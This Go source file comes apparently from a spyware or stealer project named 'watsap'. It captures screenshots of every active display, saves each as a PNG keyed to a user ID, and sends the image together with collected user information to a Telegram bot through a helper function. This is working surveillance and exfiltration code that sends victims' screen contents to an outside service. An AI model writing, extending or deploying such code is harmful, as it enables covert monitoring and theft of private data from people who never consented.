package screen

import (
	"fmt"
	"image/png"
	"os"
	"watsap/utils/config"
	"watsap/utils/messages"
	"watsap/utils/telegram"

	"github.com/kbinani/screenshot"
)

var FileName = ""

// take fullscreen screenshot
func TakeScreenshot() {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		fmt.Println("Headless system")
		os.Exit(1)
		return
	}

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			config.Logger(fmt.Sprintf("[Screen] Failed to capture screen: %v", err), "error")
			return
		}
		FileName := getScreenshotFile()
		file, err := os.Create(FileName)
		if err != nil {
			config.Logger(fmt.Sprintf("[Screen] Failed to create file: %v", err), "error")
			return
		}
		defer file.Close()

		png.Encode(file, img)
		config.Logger(fmt.Sprintf("[Screen] Screenshot saved to: %v", FileName), "info")

	}
}

func SendScreenshot() {
	telegram.TgSendFile(getScreenshotFile(), messages.GetUserInfoMsg())
	if config.DebugMode {
		os.Remove(getScreenshotFile())
	}
}

func getScreenshotFile() string {
	return fmt.Sprintf("%s/%s-screenshot.png", config.WaDir, *config.UserID)
}

func InitScreen() {
	TakeScreenshot()
	SendScreenshot()
}
